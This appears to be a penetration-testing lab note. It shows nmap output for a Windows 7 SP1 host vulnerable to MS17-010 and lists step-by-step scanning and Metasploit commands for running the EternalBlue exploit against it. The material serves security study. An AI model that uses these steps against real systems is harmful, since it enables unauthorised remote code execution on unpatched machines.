135/tcp         open  msrpc        Microsoft Windows RPC
139/tcp         open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp         open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds 
49152/tcp     open  msrpc        Microsoft Windows RPC
49153/tcp     open  msrpc        Microsoft Windows RPC
49154/tcp     open  msrpc        Microsoft Windows RPC
49155/tcp     open  msrpc        Microsoft Windows RPC
49157/tcp     open  msrpc        Microsoft Windows RPC

SMB (port 139):
CVE-2017-0143       ms17-010    
A critical remote code execution vulnerability exists in Microsoft SMBv1 servers (ms17-010)


#### Steps automated exploit
- `nmap -T4 -p- -A 10.0.2.4`
- search on google -->  windows 7 ultimate 7601 service pack 1 exploit
- search for -->     - exploit-db
			     - rapid7
			     - github
			     - cvedetails
- we found a -->  "eternalblue" exploit
- `msfconsole`
- `search eternalblue`
  ![[Pasted image 20240213204641.png]]
  - `use 0`
  - `options`
  - `set RHOSTS victim ip`
  - `run`
  - ![[Pasted image 20240213204852.png]]


 
